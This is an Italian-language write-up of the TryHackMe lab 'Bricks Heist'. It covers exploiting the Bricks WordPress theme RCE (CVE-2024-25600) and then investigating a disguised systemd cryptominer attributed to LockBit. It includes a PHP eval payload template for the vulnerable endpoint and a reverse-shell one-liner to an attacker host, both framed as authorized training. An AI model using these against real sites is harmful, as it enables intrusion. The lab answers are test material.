# TryHack3M: Bricks Heist — Write-up

**Room:** TryHack3M: Bricks Heist (TryHackMe)
**Tema:** Web Exploitation + Incident Response — RCE su WordPress Bricks → cryptominer
**Obiettivo:** Rientrare nel server compromesso di Brick Press Media Co. sfruttando una RCE, poi ricostruire l'incidente — processo malevolo, servizio di persistenza, miner e wallet — fino all'attribuzione al threat actor.

**Target:** `bricks.thm` — WordPress su HTTPS (porta 443)

**TL;DR:** Il tema WordPress **Bricks Builder** è vulnerabile a **CVE-2024-25600** (RCE non autenticata) → shell come `apache` → un finto componente di NetworkManager (`nm-inet-dialog`, avviato da `ubuntu.service`) è un **miner Bitcoin** impacchettato con PyInstaller, con il wallet offuscato in **ROT13** → il wallet è riconducibile al gruppo ransomware **LockBit**.

---

> 🔒 **Nota:** questo write-up documenta la **metodologia completa** ma **oscura i due "valori-trofeo"** che si sottomettono nella room — la **flag** e il **wallet** (`<REDACTED>`). Gli IOC (processo, servizio, log, CVE) e le tecniche restano in chiaro: sono il vero valore didattico di un'analisi di incidente. Segui i passi e i valori li ricavi da te.

> ⚠️ **Disclaimer:** esercizio svolto su lab TryHackMe autorizzato. Le tecniche di sfruttamento vanno usate solo su sistemi per cui hai esplicita autorizzazione.

---

## Ricognizione iniziale

Mappatura hostname (l'IP è quello mostrato nella pagina della room):

```bash
echo "<TARGET_IP> bricks.thm" | sudo tee -a /etc/hosts
```

Scan dei servizi:

```bash
nmap -sV -Pn -T4 bricks.thm
```

| Porta | Servizio | Note |
|-------|----------|------|
| 22/tcp   | SSH (OpenSSH 8.2p1) | — |
| 80/tcp   | **WebSockify** (Python) | *Non* è il sito — rumore, risponde `405` |
| 443/tcp  | Apache httpd (HTTPS) | **Qui gira WordPress/Bricks** |
| 3306/tcp | MySQL | — |

> Trappola da evitare: la porta 80 è WebSockify, non l'app. Il fingerprint va fatto su **HTTPS**.

Fingerprint del tema e della versione:

```bash
curl -sk https://bricks.thm/ | grep -Eio 'themes/bricks[^"]*'
curl -sk https://bricks.thm/ | grep -Eio 'name="generator" content="[^"]*"'
```

Risultato: **WordPress 6.5**, tema **Bricks** attivo, asset con timestamp di **gennaio 2024** (`?ver=17048443…`) → build **precedente alla patch 1.9.6.1** (feb 2024) → vulnerabile a **CVE-2024-25600**.

---

## Level 1 — RCE (CVE-2024-25600) e flag nascosta

**Indizio della room:**
> *"Crack the code, command the exploit… with just an RCE CVE as your key."*

### Passi

1. **Meccanismo.** Il tema espone `POST /wp-json/bricks/v1/render_element`; il campo `queryEditor` finisce in una `eval()` PHP. Serve solo un **nonce**, pubblicamente presente nella `bricksData` della home (`"nonce":"…"`).

2. **Exploit.** Recuperato il nonce, si invia un payload che esegue comandi e li restituisce nel messaggio d'eccezione della risposta JSON:

   ```
   queryEditor = throw new \Exception(shell_exec(base64_decode("<b64-cmd>")));
   ```

   Una prova con `id` restituisce:

   ```
   uid=1001(apache) gid=1001(apache) groups=1001(apache)
   ```

3. **Web root.** Un errore del tema rivela il path reale — **non** `/var/www/html` ma `/data/www/default/`:

   ```
   …/data/www/default/wp-content/themes/bricks/includes/query.php…
   ```

4. **Caccia al file.** 

   ```bash
   find /data/www -maxdepth 4 -name "*.txt" 2>/dev/null
   ```

   → nella root un `.txt` col nome ad hash e **owner `root`**: `650c844110baced87e1606453b93f22a.txt`.

### Risultato

`cat` del file restituisce la flag nel formato `THM{fl46_…}`.

> ✅ **Domanda 1 (flag):** `<REDACTED — risolvi tu!>`

**Lezione appresa:** un tema/plugin premium non aggiornato è una RCE non autenticata a portata di `curl`. Il patch management del layer applicativo (WordPress, temi, plugin) pesa quanto quello dell'OS.

---

## Level 2 — Il miner: processo e servizio

### Passi

1. **Reverse shell** come `apache` (listener `nc -lvnp 4444` + payload `bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1` via RCE).

2. **Processi.** `ps aux --sort=-%cpu` **non** mostra un miner attivo → la minaccia è installata come **servizio**, non in esecuzione al momento. Si guarda systemd:

   ```bash
   ls -la /etc/systemd/system/
   ```

   Due unit non standard spiccano:
   - **`ubuntu.service`** — owner `ubuntu:ubuntu` (un unit in `/etc/systemd/system/` di proprietà di un utente **non-root** è già un campanello)
   - `badr.service` — infrastruttura della room che si autodistrugge (`ExecStartPost … rm -f …`) → **red herring**

3. **Il unit malevolo:**

   ```ini
   # /etc/systemd/system/ubuntu.service
   [Service]
   Description=TRYHACK3M
   ExecStart=/lib/NetworkManager/nm-inet-dialog
   Restart=on-failure
   ```

### Risultato

> ✅ **Domanda 2 (processo sospetto):** `nm-inet-dialog`
> ✅ **Domanda 3 (servizio):** `ubuntu.service`

**Lezione appresa:** persistenza da manuale via systemd. Due indicatori: un unit di proprietà di un utente non-root, e un binario che si **spaccia per un componente di NetworkManager** per mimetizzarsi (`/lib/NetworkManager/nm-inet-dialog`).

---

## Level 3 — Reverse del binario: log e wallet

### Passi

1. **Fingerprint del binario.** `nm-inet-dialog` (~6.9 MB) contiene stringhe `Py_InitializeFromConfig`, `urllib3` → è un **eseguibile PyInstaller** (Python impacchettato). Le stringhe utili sono compresse nell'archivio, non in chiaro.

2. **Esfiltrazione + estrazione.** Copia del binario nella web root (scrivibile da `apache`) e download via 443, poi:

   ```bash
   pyinstxtractor-ng nm.bin      # → nm.bin_extracted/  (entry point: inet3.d.pyc)
   decompyle3 nm.bin_extracted/inet3.d.pyc
   ```

3. **Log.** Nel sorgente ricostruito:

   ```python
   log_path = os.path.join("/lib/NetworkManager/", "inet.conf")
   logging.basicConfig(filename=log_path, format="%(asctime)s %(message)s")
   ```

   → il miner scrive il proprio log in `inet.conf`.

4. **Wallet (offuscato in ROT13).** L'indirizzo è costruito così:

   ```python
   a1 = "op1dlx79spc9uq5xercepr89gxu"
   b2 = "4jegy8nig4y67dnop1dlx79spc9u"
   c3 = "nq5xercepr89gxu4jegy8nig4y67dn"
   d4 = a1 + b2 + c3
   address = ROT13(d4)          # <-- il wallet reale
   # enc_add = hex(b64(b64(address)))  --> serve SOLO alla riga "ID:" del log, non è cifratura
   ```

   Decodifica identica al codice:

   ```bash
   python3 -c "a1='op1dlx79spc9uq5xercepr89gxu';b2='4jegy8nig4y67dnop1dlx79spc9u';c3='nq5xercepr89gxu4jegy8nig4y67dn';import codecs;print(codecs.encode(a1+b2+c3,'rot_13'))"
   ```

   → in testa alla stringa compare un **indirizzo Bitcoin bech32 valido** (`bc1q…`, 42 caratteri).

### Risultato

> ✅ **Domanda 4 (log del miner):** `inet.conf`
> ✅ **Domanda 5 (wallet):** `<REDACTED — risolvi tu!>` *(bech32 `bc1q…`, ricavabile col ROT13 qui sopra)*

**Lezione appresa:** **ROT13 non è cifratura** e un eseguibile PyInstaller si spacchetta in pochi comandi. Base64/ROT13/packing rallentano l'analisi di minuti — non proteggono nulla.

---

## Level 4 — Attribuzione del wallet

### Passi

1. **Lookup on-chain.** L'indirizzo, cercato su un explorer (mempool.space / blockchain.com), risulta **reale** e con storico transazioni.

   ```bash
   curl -s "https://mempool.space/api/address/<WALLET>"
   ```

2. **Threat intel.** Le transazioni di quel wallet lo collegano a un gruppo ransomware noto, con riscontri anche in designazioni **OFAC** del Tesoro USA.

### Risultato

> ✅ **Domanda 6 (gruppo):** `LockBit` *(7 lettere — combacia con la maschera della room)*

**Lezione appresa:** un IOC on-chain è un pivot di attribuzione. Dal singolo wallet, tramite le transazioni pubbliche e la threat intelligence, si arriva al threat actor. La blockchain è pubblica e permanente — comoda per chi difende, non solo per chi attacca.

---

## Riepilogo finale

| # | Domanda | Tecnica | Risposta |
|---|---------|---------|----------|
| 1 | Contenuto del `.txt` nascosto | CVE-2024-25600 (RCE non-auth) | `<REDACTED>` |
| 2 | Processo sospetto | Enumerazione systemd | `nm-inet-dialog` |
| 3 | Servizio associato | Unit in `/etc/systemd/system` | `ubuntu.service` |
| 4 | Log del miner | Reverse del PyInstaller | `inet.conf` |
| 5 | Wallet del miner | Deoffuscamento ROT13 | `<REDACTED>` |
| 6 | Gruppo dietro il wallet | Attribuzione on-chain | `LockBit` |

### Catena dell'attacco

```
Bricks Builder ≤ 1.9.6 (CVE-2024-25600)
   └─ RCE non-auth (render_element) ──► shell apache ──► flag in /data/www/default
        └─ persistenza: ubuntu.service ──► /lib/NetworkManager/nm-inet-dialog (PyInstaller)
             └─ miner Bitcoin · log in inet.conf · wallet offuscato in ROT13
                  └─ wallet on-chain ──► attribuzione: LockBit
```

### Conclusioni

1. **Patch management applicativo** — temi/plugin WordPress vanno aggiornati come e più dell'OS: qui una RCE non autenticata parte da un `curl`.
2. **Monitorare `/etc/systemd/system/`** — unit di proprietà non-root e binari "sosia" (che imitano componenti legittimi) sono persistenza classica.
3. **Offuscamento ≠ sicurezza** — ROT13, base64 e PyInstaller si invertono banalmente.
4. **Gli IOC on-chain abilitano l'attribuzione** — un wallet è un anello che porta al gruppo.

---

*Write-up prodotto a scopo didattico sulla room TryHackMe "TryHack3M: Bricks Heist", in ambiente autorizzato.*

— ref1o · [GitHub](https://github.com/ref1o)
